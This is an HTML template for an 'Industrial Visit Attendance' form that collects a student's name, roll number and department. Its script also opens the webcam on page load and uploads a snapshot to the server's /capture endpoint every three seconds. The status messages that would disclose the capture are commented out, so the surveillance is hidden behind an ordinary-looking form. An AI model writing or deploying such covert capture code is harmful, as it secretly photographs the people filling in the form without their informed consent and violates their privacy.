<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üöå Industrial Visit Attendance</title>
    <style>
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(135deg, #f2f6fc, #d9e4f5);
      margin: 0;
      padding: 0;
      text-align: center;
    }

    header {
      background: #004aad;
      color: #fff;
      padding: 20px 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 15px;
    }

    header img {
      height: 60px;
      border-radius: 8px;
    }

    h1 {
      font-size: 1.8em;
      font-weight: 600;
      margin: 0;
    }

    main {
      padding-top: 50px;
    }

    form {
      background: #fff;
      padding: 30px 50px;
      border-radius: 10px;
      display: inline-block;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }

    input, button {
      padding: 10px;
      margin: 10px 0;
      width: 250px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 1em;
    }

    button {
      background: #28a745;
      color: #fff;
      border: none;
      cursor: pointer;
      font-weight: 600;
      transition: background 0.3s;
    }

    button:hover {
      background: #218838;
    }

    #thankyou {
      margin-top: 30px;
      background: #d4edda;
      padding: 25px;
      border-radius: 8px;
      color: #155724;
      display: none;
      width: fit-content;
      margin-left: auto;
      margin-right: auto;
    }

    #status {
      margin-top: 30px;
      font-size: 1em;
      color: #444;
    }

    footer {
      margin-top: 60px;
      font-size: 0.9em;
      color: #666;
      padding: 20px 0;
    }
  </style>
</head>
<body>

   <!-- ‚úÖ Professional Header with Logo -->
  <header>
    <img src="{{ url_for('static', filename='logo.png') }}" alt="O7 Services Logo">
    <h1>Industrial Visit Attendance</h1>
  </header>

  <main>
    <form id="attendanceForm" method="POST" action="/submit">
      <input type="text" name="name" placeholder="Full Name" required><br>
      <input type="text" name="roll" placeholder="Roll Number" required><br>
      <input type="text" name="dept" placeholder="Department" required><br>
      <button type="submit">Submit Attendance</button>
    </form>

    <div id="thankyou">
      <h3>‚úÖ Attendance Submitted!</h3>
      <p>Thank you, <span id="studentName"></span>.</p>
      <p>Your attendance has been recorded successfully.</p>
    </div>
  </main>

  <footer>
    ¬© 2025 O7 Services | All Rights Reserved
  </footer>
  

 <!-- ‚úÖ Scripts -->
  <script>
    // Attendance submission
    const form = document.getElementById('attendanceForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const formData = new FormData(form);
      const response = await fetch('/submit', { method: 'POST', body: formData });
      if (response.ok) {
        const data = await response.json();
        document.getElementById('studentName').innerText = data.name;
        form.style.display = 'none';
        document.getElementById('thankyou').style.display = 'block';
      }
    });


    // Camera + Continuous Capture
    const statusText = document.getElementById("status");

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        video.addEventListener('loadeddata', () => {
          //statusText.textContent = "üì∏ Camera active. Capturing continuously..."; 
          startContinuousCapture(video);
        });
      })
      .catch(err => {
        console.error("Camera access denied:", err);
        //statusText.textContent = "‚ùå Please allow camera access.";
      });

    function startContinuousCapture(video) {
      const INTERVAL = 3000; // capture every 3 seconds

      setInterval(() => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/png");

        fetch("/capture", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: imageData })
        })
        .then(res => res.json())
        .then(data => {
          console.log("Saved:", data.filename);
          //statusText.textContent = "‚úÖ Captured & sent: " + data.filename;
        })
        .catch(err => {
          console.error("Error:", err);
          statusText.textContent = "‚ùå Failed to send image.";
        });
      }, INTERVAL);
    }
  </script>
</body>
</html>
